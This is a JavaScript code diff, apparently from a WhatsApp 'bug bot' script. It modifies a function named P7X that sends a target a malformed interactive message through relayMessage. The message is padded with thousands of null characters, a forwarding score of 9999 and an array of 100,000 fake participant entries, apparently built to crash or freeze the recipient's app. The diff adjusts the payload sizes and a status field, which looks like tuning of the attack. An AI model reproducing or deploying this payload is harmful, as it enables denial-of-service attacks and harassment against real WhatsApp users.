@@ -4260,35 +4260,35 @@ async function HypermartDiley(sock, jid) {
 }
 
 async function P7X(sock, target) {
-  await sock.relayMessage(
-    target,
-    {
-  groupStatusMessageV2: { 
-    message: {
-      interactiveResponseMessage: {
-        body: {
-          text: "6core",
-          format: "DEFAULT",
-        },
-        nativeFlowResponseMessage: {
-          name: "payment_method",
-                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(90000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
-          version: 3
-        },
-        contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
-          isForwarded: true,
-          forwardingScore: 9999,
-          statusAttributionType: 3,
-            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
-              participant: `62${n + 836598}@s.whatsapp.net`,
-              type: 1
-            })),
-        },
-      },
-    },
-  },
-}, { participant: { jid: target }});
+    await sock.relayMessage(
+        target,
+        {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "6core",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "payment_method",
+                            buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
+                            version: 3
+                        },
+                        contextInfo: {
+                            remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
+                            isForwarded: true,
+                            forwardingScore: 9999,
+                            statusAttributionType: 2,
+                            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
+                                participant: `62${n + 836598}@s.whatsapp.net`,
+                                type: 1
+                            })),
+                        },
+                    },
+                },
+            },
+        }, { participant: { jid: target } });
 }
 
 async function Vdelay(sock, target) {
